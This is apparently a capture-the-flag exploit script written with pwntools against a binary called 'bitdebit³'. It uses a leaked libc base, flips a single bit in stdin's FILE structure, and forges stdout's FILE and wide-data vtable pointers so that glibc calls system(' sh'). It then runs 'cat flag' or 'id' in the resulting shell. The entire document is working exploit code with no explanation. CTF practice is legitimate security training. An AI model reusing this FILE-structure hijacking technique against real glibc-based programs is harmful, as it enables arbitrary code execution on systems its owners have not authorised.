from pwn import *
import re

e = ELF('./bitdebit³_patched', checksec=False)
l = ELF('./libc.so.6', checksec=False)

h = args.HOST 

if args.REMOTE:
    p = remote(h, 1337, ssl=True, sni=h)
else:
    p = process([b'./bitdebit\xc2\xb3_patched'])

d = p.recvuntil(b'first addr\n')
l.address = int(re.search(rb'libc base: (0x[\da-f]+)', d)[1], 16)

i = l.sym._IO_2_1_stdin_
o = l.sym._IO_2_1_stdout_
s = i + 0x83
w = o + 0x100
v = o + 0x200
x = bytearray(v + 0x70 - s)

def q(a, z):
    x[a-s:a-s+8] = p64(z)

k = next(j for j in range(12, 48) if not ((i + 0x84) >> j) & 1)

q(i + 0x88, l.address + 0x21ca80)
x[o-s:o-s+8] = b' sh\0\0\0\0\0'
q(o + 0x20, 0)
q(o + 0x28, 1)
q(o + 0x88, l.address + 0x21ca70)
q(o + 0xa0, w)
q(o + 0xd8, l.sym._IO_wfile_jumps)
q(w + 0xe0, v)
q(v + 0x68, l.sym.system)

p.sendline(str(i + 0x40 + k // 8).encode())
p.recvuntil(b'first bit\n')
p.send(str(k % 8).encode() + b'\n' + x)
p.recvuntil(b'What was your name? I didnt get it\n')
sleep(0.5)

if args.REMOTE:
    p.sendline(b'cat flag; exit')
else:
    p.sendline(b'echo PWNED; id; exit')

print(p.recvrepeat(3).decode(errors='ignore'), end='')
